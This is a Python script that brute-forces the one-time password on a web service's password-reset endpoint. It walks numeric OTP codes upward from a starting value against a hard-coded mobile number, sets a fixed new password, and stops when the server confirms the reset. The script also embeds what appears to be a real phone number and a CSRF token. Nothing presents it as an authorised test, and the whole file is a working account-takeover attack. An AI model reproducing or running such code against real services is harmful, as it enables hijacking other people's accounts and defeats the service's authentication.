import requests
import re
import sys
sys.path.append('/WB')
import config


def forgot_password(mobile, otp, password, cnf_password):
    # data = {
    #    "mobile": mobile,
    #     "otp": otp,
    #     "password": password,
    #     "password_confirmation": cnf_password,
    #     "_token": config.TOKEN
    # }

    d = {
                "mobile": "7829862342",
                "otp": otp,
                "password": "APassword@123",
                "password_confirmation": "APassword@123",
                "_token": "mSn7QwTsIYT1RuTMoGAJuBqnxMGpIWKKIIpsm6zV"
            }
    
    


    response = requests.post(config.WITHDRAW_URL, data=d)

    if response.status_code == 200:
         if re.search(r"Password reset successfully.", response.text):
             print(response.text , otp)
             return 1
         elif re.search(r"OTP Expired, Please Create new OTP!", response.text):
             print("Error: " , otp , "otp expired create new one.")
             return 3
         else:
             print("Error:", otp, response.text)
             return 2
    else:
         print("Error:", response.status_code , response.text)
         return 3

if __name__ == "__main__":
    # session = requests.Session()
    # mobile = config.MOBILE_NUMBER
    # password = config.PASSWORD
    # cnf_password = config.CNF_PASSWORD
    URL = config.WITHDRAW_URL
    otp = 3390


    mobile = 7829862342
    password = "APassword@123"
    cnf_password = "APassword@123"

    while otp <= otp+3:
        try:
            result = forgot_password(mobile, otp, password, cnf_password)
            if result == 1:
                break
            elif result == 2:
                otp += 1
            else:
                continue
        except Exception as e:
            print(f"Error for OTP {otp}: {e}")
